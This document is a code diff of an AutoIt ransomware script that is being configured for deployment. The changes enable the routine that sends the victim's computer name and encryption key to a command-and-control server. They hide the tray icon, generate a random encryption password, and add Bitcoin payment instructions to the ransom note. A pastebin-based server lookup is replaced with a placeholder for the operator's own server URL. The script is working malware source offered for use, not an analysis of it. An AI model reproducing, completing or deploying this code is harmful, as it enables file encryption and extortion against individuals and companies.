@@ -1,5 +1,5 @@
 #RequireAdmin
-;#NoTrayIcon
+#NoTrayIcon
 #include <includes.au3>
 
 ;----------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -20,7 +20,7 @@ Global $scriptfullpath = FileGetShortName(@ScriptFullPath)
 
 ;----------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Global $key = "123" ;password_generator("20","30")
+password_generator("20","30") ; Generates a password between 20 and 30 charecters
 
 Global $first_run = DriveGetSerial(true_homedrive())
 
@@ -185,9 +185,8 @@ EndFunc   ;==>start
 ;----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ;We are done encrypting all files, and now we are sending the en/de cryption password to the control panel.
-;we should probably add a firewall exeption here???
 
-;callhome()
+callhome()
 
 ;----------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -242,11 +241,11 @@ $read_btc_file = FileRead($CommonFilesDir & "\" & $reverse_diskid)
 if domaincheck() = True Then
 $Edit2 = GUICtrlCreateEdit("All company files have been encrypted, please contact your IT support department." & @CRLF & "The files must be decrypted from this computer: " & @ComputerName & @CRLF & _
 "The only way you can recover your files is to buy a decryption key, is to buy a decryption key." & _
-@CRLF & "The payment method is: Bitcoins. " & " The price is: " & $read_btc_file & _
+@CRLF & "The payment method is: Bitcoins. After you buy the required amount send the payment to <Your BTC address>. Also include your computers System Name (You can find this inside of System Information)." & " The price is: " & $read_btc_file & _
 @CRLF & @CRLF & "Click on the 'Buy decryption key' button.", 16, 456, 768, 177,$ES_READONLY)
 GUICtrlSetFont(-1, 12, 800, 0, "Calibri")
 Else
-$Edit2 = GUICtrlCreateEdit("The only way you can recover your files is to buy a decryption key" & @CRLF & "The payment method is: Bitcoins. " & " The price is: " & $read_btc_file & _
+$Edit2 = GUICtrlCreateEdit("The only way you can recover your files is to buy a decryption key" & @CRLF & "The payment method is: Bitcoins. After you buy the required amount send the payment to <Your BTC address>. Also include your computers System Name (You can find this inside of System Information)." & " The price is: " & $read_btc_file & _
 @CRLF & @CRLF & "Click on the 'Buy decryption key' button.", 16, 456, 768, 177,$ES_READONLY)
 GUICtrlSetFont(-1, 12, 800, 0, "Calibri")
 EndIf
@@ -528,41 +527,6 @@ EndFunc
 
 ;----------------------------------------------------------------------------------------------------------------------------------------------------------
 
-;This function is used for grabbing the C&C (controle center / admin panel) We got 5 pastebin links, each pastebin will contain the same, or different links
-;But only 1 link per pastebin. It's your choice whenever you want to direct the domains to the same C&C, or to different C&s's.
-Func pastebin()
-	HttpSetUserAgent("Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36")
-	$raw = "http://pastebin.com/raw.php?i="
-
-	$pastie1 = BinaryToString(InetRead($raw & "3y3CfuB"))
-	If Not @error Then
-		Return $pastie1
-	EndIf
-
-	$pastie2 = BinaryToString(InetRead($raw & "4b9kE6w"))
-	If Not @error Then
-		Return $pastie2
-	EndIf
-
-	$pastie3 = BinaryToString(InetRead($raw & "vMQWsvS"))
-	If Not @error Then
-		Return $pastie3
-	EndIf
-
-	$pastie4 = BinaryToString(InetRead($raw & "Tj26ZAf"))
-	If Not @error Then
-		Return $pastie4
-	EndIf
-
-	$pastie5 = BinaryToString(InetRead($raw & "55wPy9CD"))
-	If Not @error Then
-		Return $pastie5
-	EndIf
-
-EndFunc   ;==>pastebin
-
-;----------------------------------------------------------------------------------------------------------------------------------------------------------
-
 ;If it's a company machine, the price will be different from a personal machine. This func is used to notify the user how much it costs to decrypt his files.
 Func _Get_bitcoin_value()
 
@@ -743,7 +707,7 @@ Func callhome()
 	$data = "pcname=" & @ComputerName & "&hwid=" & $key & "&version=Locker"
 	$oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
 	$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
-	$oHTTP.Open("POST", pastebin(), False) ;ex: http://127.0.0.1/panel/settings.php in the pastebins
+	$oHTTP.Open("POST", "<url you hosted the C&C on", False) ;ex: http://127.0.0.1/panel/bot/log.php
 	$oHTTP.SetRequestHeader("User-Agent", "agent")
 	$oHTTP.SetRequestHeader("Referrer", "http://www.yahoo.com")
 	$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
